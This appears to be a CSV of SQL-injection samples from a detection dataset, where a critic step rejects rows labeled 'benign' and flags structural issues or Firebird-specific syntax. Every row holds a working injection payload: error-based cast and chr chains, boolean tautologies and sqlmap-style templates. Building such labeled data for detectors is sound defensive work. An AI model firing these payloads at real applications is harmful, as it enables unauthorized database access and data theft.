row_index,payload_norm,sqli_type,db_engine,confidence,reasoning,label_source,verdict,critic_evidence,correction_json
30880,"select * from users WHERE username = ""-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- szgq"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (3); parentheses mismatch (16 open, 18 close). Plus attack signal detected -> benign label wrong",
31279,"select * from users WHERE username = ""1\' ) and username = ""-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- szgq""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (3); parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
32777,"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-2992\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (3); parentheses mismatch (32 open, 34 close). Plus attack signal detected -> benign label wrong",
32827,"select * from users WHERE username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1"" and ( ( \'%\' = \'""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (5); parentheses mismatch (18 open, 16 close). Plus attack signal detected -> benign label wrong",
33211,"select * from users WHERE username = ""-6244\' ) as szpd where 8445 = 8445 --"" and username = ""-7874 ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (3); parentheses mismatch (17 open, 21 close). Plus attack signal detected -> benign label wrong",
34226,"select * from users WHERE username = ""-9847%\' ) ) ) or-- 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (33 open, 39 close). Plus attack signal detected -> benign label wrong",
34745,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (3); parentheses mismatch (33 open, 36 close). Plus attack signal detected -> benign label wrong",
35011,"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6036 ) ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (3); parentheses mismatch (16 open, 19 close). Plus attack signal detected -> benign label wrong",
35827,"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1"" and ( ( ( \'%\' = \'""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (3); unbalanced double quotes (5); parentheses mismatch (19 open, 16 close). Plus attack signal detected -> benign label wrong",
37484,"select * from users WHERE username = ""-3424\' ) ) and username = ""1"" and username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (5); parentheses mismatch (16 open, 18 close). Plus attack signal detected -> benign label wrong",
37585,"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1"" or username = ""1\' where 8537 = 8537",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (5). Plus attack signal detected -> benign label wrong,
37902,"SELECT * FROM users WHERE username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (3). Plus attack signal detected -> benign label wrong,
37995,"select * from users WHERE username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (3); parentheses mismatch (32 open, 34 close). Plus attack signal detected -> benign label wrong",
38134,"select * from users WHERE username = ""1"" and username = ""1"" and username = ""1 ) where 3381 = 3381 --""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
38218,"select * from users WHERE username = ""1\' ) ) ) and username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (3); parentheses mismatch (16 open, 19 close). Plus attack signal detected -> benign label wrong",
38959,"select * from users WHERE username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-8069\' ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (16 open, 18 close). Plus attack signal detected -> benign label wrong",
39128,"select * from users WHERE username = ""-1254"" and username = ""1 and username = ""-8057\' ) ) as gpue where 4205 = 4205 || 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); unbalanced double quotes (5); parentheses mismatch (16 open, 18 close). Plus attack signal detected -> benign label wrong",
39570,"select * from users WHERE username = ""-4610\' ) ) or username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (16 open, 18 close). Plus attack signal detected -> benign label wrong",
40031,"SELECT * FROM users WHERE uSername = ""-8057\' ) ) aS gpue where 4205 = 4205 || 3440 = caSt ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( Select ( caSe when ( 3440 = 3440 ) then 1 elSe 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) aS numeric ) --"" AND username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (3); parentheses mismatch (32 open, 37 close). Plus attack signal detected -> benign label wrong",
40589,AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]') AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
40590,OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]') OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
40613,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')) (SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
40627,",(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')) ,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
40636,SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' FROM RDB$DATABASE,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
40788,' OR 0x313d31--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
40802,' AND 1=(SELECT COUNT(*) FROM all_tables)--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
